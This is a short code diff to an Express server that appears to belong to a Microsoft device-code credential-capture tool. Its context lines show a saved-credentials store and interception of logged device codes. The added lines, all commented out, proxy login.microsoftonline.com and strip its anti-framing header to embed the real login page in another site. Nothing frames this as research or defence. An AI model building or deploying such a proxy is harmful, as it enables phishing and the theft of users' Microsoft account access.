@@ -22,6 +22,7 @@ const savedCredentials = {};
 
 const app = express();
 app.use(express.json());
+// app.use('/html', express.static('public'));
 
 // Intercept specific console.log calls to extract device code
 const oldConsoleLog = console.log;
@@ -116,6 +117,17 @@ app.get('/', (req, res) => {
     res.json('Auth success');
   });
 });
+
+// Attempt to bypass login page iframe limitations
+// app.use('/ms', proxy('login.microsoftonline.com', {
+//   https: true,
+//   // preserveHostHdr: true,
+//   userResHeaderDecorator(headers, userReq, userRes, proxyReq, proxyRes) {
+//     delete headers['x-frame-options'] 
+//     headers['access-control-allow-origin'] = '*';
+//     return headers;
+//   }
+// }));
 
 // Start the server
 app.listen(port, () => {
